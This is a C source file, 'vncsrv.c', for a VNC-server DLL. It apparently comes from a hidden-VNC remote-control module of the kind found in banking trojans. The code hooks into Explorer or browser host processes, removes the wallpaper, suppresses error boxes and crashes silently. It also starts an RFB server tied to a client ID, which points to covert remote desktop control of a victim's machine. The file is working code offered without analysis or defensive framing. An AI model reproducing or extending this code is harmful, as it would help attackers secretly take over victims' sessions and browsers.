//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: vncsrv.c
// $Revision: 195 $
// $Date: 2014-07-11 16:56:29 +0400 (Пт, 11 июл 2014) $
// description:
//	VNC-server DLL.

#include "vncmain.h"
#include <malloc.h>
#include "vncwnd.h"
#include "shell.h"
#include "..\vnc\browser.h"
#include "..\vnc\system.h"
#include "..\rt\str.h"

#undef WAIT_OBJECT_0
#define WAIT_OBJECT_0 0


VNC_SHARED_SECTION	g_VncSharedSection = {0};
PVNC_SESSION		g_pSession = NULL;
BOOL				g_bIsShell = FALSE;
VOID				VncServerUpdate(PVNC_SESSION pSession);

typedef
LPTOP_LEVEL_EXCEPTION_FILTER
(WINAPI *FUNC_SetUnhandledExceptionFilter)(
	__in LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter
	);


WINERROR WINAPI VncStatusThread(PVNC_SHARED_SECTION VncSharedSection)
{
	WINERROR	Status;
	DWORD Timeout = g_bIsShell ? 1000 : INFINITE;
	HANDLE		WaitObjects[3] = {g_AppShutdownEvent, VncSharedSection->hStatusEvent, VncSharedSection->hUpdateEvent };

	do {
		Status = WaitForMultipleObjects(2, (PHANDLE)&WaitObjects, FALSE, Timeout);

		if ( Status == WAIT_OBJECT_0 ){
			VncReleaseSharedSection(VncSharedSection);
			break;
		} else if ( Status == (WAIT_OBJECT_0 + 1) ){
			HANDLE hProcess;
			VncReleaseSharedSection(VncSharedSection);
			// VNC session status event fired, terminating process
			//ExitProcess(0);

			DbgPrint("terminating process\n");
			hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, GetCurrentProcessId());
			if ( hProcess ){
				TerminateProcess( hProcess, 0 );
			}
			break;
		} else if ( Status == (WAIT_OBJECT_0 + 2) ){
			// signal update
			VncServerUpdate(g_pSession);
		}else if ( Status == WAIT_TIMEOUT ){
			ASSERT(g_bIsShell);
			if ( RemoveWallpaper(VncSharedSection->Data->dwHeight,VncSharedSection->Data->dwWidth) )
			{
				Timeout = INFINITE;
			}
		}
			
	} while ( TRUE );

	return(0);
}

LPTOP_LEVEL_EXCEPTION_FILTER  pUnhandledExceptionFilter = NULL;

// default exception handler just terminates the process
LONG WINAPI 
	VncServerUnhandledExceptionFilter(
		struct _EXCEPTION_POINTERS* ExceptionInfo
		)
{
	HANDLE hProcess;

	DbgPrint("UNHANDLED EXCEPTION.\n");

	// VNC session status event fired, terminating process
	//ExitProcess(0);
	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, GetCurrentProcessId());
	if ( hProcess ){
		TerminateProcess( hProcess, 0 );
	}
	if ( pUnhandledExceptionFilter )
	{
		return pUnhandledExceptionFilter( ExceptionInfo );
	}
	return EXCEPTION_EXECUTE_HANDLER;
}

VOID VncServerSetUnhandledExceptionFilter( VOID )
{
	FUNC_SetUnhandledExceptionFilter pSetUnhandledExceptionFilter;

	DbgPrint("setting exception handler.\n");
	pSetUnhandledExceptionFilter = 
		(FUNC_SetUnhandledExceptionFilter)
			GetProcAddress(
				GetModuleHandleW(wczNtdll),
				"RtlSetUnhandledExceptionFilter"
				);
	if ( !pSetUnhandledExceptionFilter ) {
		DbgPrint("RtlSetUnhandledExceptionFilter is not available\n");
		pSetUnhandledExceptionFilter = SetUnhandledExceptionFilter;
	}
	pUnhandledExceptionFilter = 
		pSetUnhandledExceptionFilter(
			VncServerUnhandledExceptionFilter
			);
}

VOID VncServerUpdate ( PVNC_SESSION pSession )
{
	//DWORD dwHeight,dwWidth;
	//PIXEL_FORMAT PixelFormat;

	// nothing for now
}


WINERROR VncServerInit(HMODULE hModule)
{
	PVNC_SESSION VncSession = NULL;
	WINERROR Status = ERROR_UNSUCCESSFULL;
	HDESK hDesktop = GetThreadDesktop(GetCurrentThreadId());

	USES_CONVERSION;

	do	// not a loop
	{
		OsGetVersion();

		MessageBoxTimeout = (_MessageBoxTimeout)GetProcAddress(GetModuleHandle(_T("user32")), "MessageBoxTimeoutA");
		if (!MessageBoxTimeout)
		{
			Status = ERROR_PROC_NOT_FOUND;
			break;
		}

		// Trying to open VNC shared section
		Status = VncInitSharedSection(hDesktop, &g_VncSharedSection, 0, FALSE);
		if (Status != NO_ERROR)
		{
			if (Status == ERROR_FILE_NOT_FOUND) // VNC shared section was not initialized. This means we are not within VNC session process.
				DbgPrint("Shared section not initialized.\n");
			break;
		}

		// We are started within VNC session process.

		// setup system
		SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOOPENFILEERRORBOX);
		VncServerSetUnhandledExceptionFilter();

		// allocate vnc session context
		VncSession = hAlloc(sizeof(VNC_SESSION) + DESKTOP_NAME_LENGTH);
		if (VncSession == NULL)
			break;

		// Initializing VNC_SESSION
		memset(VncSession, 0, sizeof(VNC_SESSION));
#if _DEBUG
		VncSession->Magic = VNC_SESSION_MAGIC;
#endif
		// allocate session lock
		VncSession->hLockMutex = CreateMutex(NULL, FALSE, NULL);
		if (!VncSession->hLockMutex)
			break;

		Status = DeskInitializeClient(&VncSession->Desktop, &g_VncSharedSection);
		if (Status != NO_ERROR)
			break;

		VncSession->SharedSection = g_VncSharedSection;

		DbgPrint("Shared section mapped at 0x%p. Starting within VNC session process.\n", g_VncSharedSection.Data);

		// Creating VNC status thread
		CloseHandle(CreateThread(NULL, 0, &VncStatusThread, &g_VncSharedSection, 0, NULL));

		while (g_VncSharedSection.Data && !g_VncSharedSection.Data->dwExplorersPID)
			Sleep(1);

		if (g_VncSharedSection.Data && g_VncSharedSection.Data->dwExplorersPID == GetCurrentProcessId())
		{
			g_bIsShell = TRUE;
			if (!IsXP())
			{
				HWND hProgmanWnd = FindWindowEx(NULL, NULL, _T("Progman"), _T("Program Manager"));
				VncSession->Desktop.hDefView = FindWnd(hProgmanWnd, _T("SHELLDLL_DefView"), NULL);
				VncSession->Desktop.hDeskListView = FindWnd(VncSession->Desktop.hDefView, _T("SysListView32"), _T("FolderView"));
			}
		}
		else
		{
			BR_DetectAndInit(VncSession, T2W(g_CurrentProcessPath),	g_HostProcess);
		}

		VncSession->Desktop.hTrayWnd = FindWnd(NULL, _T("Shell_TrayWnd"), NULL);
		VncSession->Desktop.hOverflowIconWindow = FindWnd(NULL, _T("NotifyIconOverflowWindow"), NULL);

		g_pSession = VncSession;
		Status = NO_ERROR;

		// disabling visual styles - http://msdn.microsoft.com/en-us/library/windows/desktop/bb773175(v=vs.85).aspx#ignore_top_level
		{
			typedef void  (WINAPI *FUNC_SetThemeAppProperties)(DWORD dwFlags);
			HMODULE hModule = GetModuleHandle(TEXT("UxTheme.dll"));
			if (hModule)
			{
				FUNC_SetThemeAppProperties SetThemeAppPropertiesPtr = (FUNC_SetThemeAppProperties)GetProcAddress(hModule, "SetThemeAppProperties");
				if (SetThemeAppPropertiesPtr)
					SetThemeAppPropertiesPtr(0);
			}
		}

		// init gdi for painting
		ScrStartup();

		// init windows management
		VncWndInitialize(VncSession);

	} while (FALSE);

	if (Status != NO_ERROR && Status != ERROR_FILE_NOT_FOUND)
	{
		if (VncSession)
		{
			// release desktop
			DeskRelease(&VncSession->Desktop);

			if (VncSession->hLockMutex)
				CloseHandle(VncSession->hLockMutex);

			if (VncSession->Desktop.hPaintingMutex)
			{
				CloseHandle(VncSession->Desktop.hPaintingMutex);
				VncSession->Desktop.hPaintingMutex = NULL;
			}

			hFree(VncSession);
		}

		// release shared data
		VncReleaseSharedSection(&g_VncSharedSection);
	}

	UNREFERENCED_PARAMETER(hModule);
	return Status;
}

void VncServerCleanup(void)
{	
	if (g_pSession)
	{
		if (g_pSession->Desktop.hPaintingMutex)
		{
			CloseHandle(g_pSession->Desktop.hPaintingMutex);
			g_pSession->Desktop.hPaintingMutex = NULL;
		}

		// clean-up shell specific stuff
		if (g_bIsShell)
			ShellHookDectivate();

		// release desktop
		DeskRelease(&g_pSession->Desktop);

		if (g_pSession->hLockMutex)
			CloseHandle(g_pSession->hLockMutex);

		VncWndRelease(g_pSession);
		hFree(g_pSession);
	}
}

void __stdcall StopServer(PVOID ServerHandle)
{
	PRFB_SERVER	pServer = (PRFB_SERVER)ServerHandle;

	if (!pServer)
		return;

	ASSERT_RFB_SERVER(pServer);

	if (pServer->pClientId)
		LocalFree(pServer->pClientId);

	RfbCleanup(pServer);

#if _DEBUG
	pServer->Magic = 0;
#endif

	hFree(pServer);
	WSACleanup();
}

WINERROR __stdcall StartServer(PVOID * pServerHandle, SOCKADDR_IN * pServerAddress, LPSTR pClientId)
{
	WSADATA WsaData;
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PRFB_SERVER	pServer = NULL;

	do
	{
		WSAStartup(0x202, &WsaData);

		if (NULL == (pServer = hAlloc(sizeof(RFB_SERVER))))
			break;

		memset(pServer, 0, sizeof(RFB_SERVER));
		memcpy(&pServer->ServerAddress, pServerAddress, sizeof(SOCKADDR_IN));

		pServer->pClientId = StrDup(pClientId);
		if (!pServer->pClientId)
			break;

#if _DEBUG
		pServer->Magic = RFB_SERVER_MAGIC;
#endif

		if (NO_ERROR != (Status = RfbStartup(pServer)))
			break;

		*pServerHandle = pServer;
	} while (FALSE);

	if (NO_ERROR != Status)
		StopServer(pServer);

	return Status;
}
